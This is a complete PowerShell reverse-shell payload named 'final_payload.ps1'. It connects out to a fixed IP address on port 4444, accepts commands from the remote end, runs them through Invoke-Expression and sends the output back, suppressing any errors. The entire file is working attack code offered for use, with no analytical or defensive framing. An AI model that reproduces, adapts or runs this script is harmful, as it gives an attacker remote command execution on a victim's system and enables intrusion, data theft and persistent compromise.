# final_payload.ps1 - Guaranteed to work
$ip = "192.168.150.2"
$port = 4444

try {
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    $buffer = New-Object Byte[] 8192
    
    # Send initial connection message
    $msg = [System.Text.Encoding]::UTF8.GetBytes("[+] Connected to $ip`r`n")
    $stream.Write($msg, 0, $msg.Length)
    $stream.Flush()
    
    while ($true) {
        # Send prompt
        $prompt = [System.Text.Encoding]::UTF8.GetBytes("PS> ")
        $stream.Write($prompt, 0, $prompt.Length)
        $stream.Flush()
        
        # Wait for command
        $bytesRead = 0
        $cmd = ""
        while ($bytesRead -eq 0) {
            if ($stream.DataAvailable) {
                $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
                if ($bytesRead -gt 0) {
                    $cmd = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead).Trim()
                }
            }
            Start-Sleep -Milliseconds 100
        }
        
        if ($cmd -eq "exit") { break }
        
        # Execute command
        try {
            $output = Invoke-Expression $cmd 2>&1 | Out-String
            if ($output -eq "") { $output = "[+] Command executed successfully`r`n" }
        } catch {
            $output = "ERROR: $($_.Exception.Message)`r`n"
        }
        
        # Send output
        $outputBytes = [System.Text.Encoding]::UTF8.GetBytes($output)
        $stream.Write($outputBytes, 0, $outputBytes.Length)
        $stream.Flush()
    }
    
    $client.Close()
} catch {
    # Silent fail
}

